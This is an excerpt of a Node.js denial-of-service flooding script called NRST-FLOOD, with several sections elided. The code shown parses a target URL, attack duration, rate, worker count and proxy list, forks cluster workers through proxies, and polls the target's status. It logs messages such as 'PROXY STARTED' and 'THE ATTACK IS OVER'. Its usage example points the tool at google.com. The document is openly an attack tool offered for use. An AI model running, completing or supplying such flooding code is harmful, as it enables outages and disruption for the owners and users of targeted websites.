 ...
 if (process.argv.length < 7){console.log("\x1b[32m" + `
  ...
  Usage:
  node NRST-FLOOD.js https://google.com 120 32 8 proxy.txt
 \x1b[0m`); 
process.exit();}
 const headers = {};
 ...
 const getCurrentTime = () => {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(`${getCurrentTime()} [NRST-FLOOD]  \x1b[32mSTATUS\x1b[0m \x1b[37m:\x1b[0m ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'REQUEST TIMEOUT') {
        console.log(`${getCurrentTime()} [NRST-FLOOD]  \x1b[31mREQUEST TIMEOUT\x1b[0m`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`${getCurrentTime()} [NRST-FLOOD]  \x1b[32mSTATUS\x1b[0m \x1b[37m:\x1b[0m ${extractedTitle}`);
      } else {
        console.log(`${getCurrentTime()} [NRST-FLOOD]  ${error.message}`);
      }
    });
}
...
\x1b[0m`);
  ...
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`${getCurrentTime()} [NRST-FLOOD]  \x1b[33mPROXY ${i} STARTED\x1b[0m`);
  }
  console.log(`${getCurrentTime()} [NRST-FLOOD]  \x1b[32mSTARTED RUNNING\x1b[0m`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`${getCurrentTime()} [NRST-FLOOD]  \x1b[31mTHE ATTACK IS OVER\x1b[0m`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
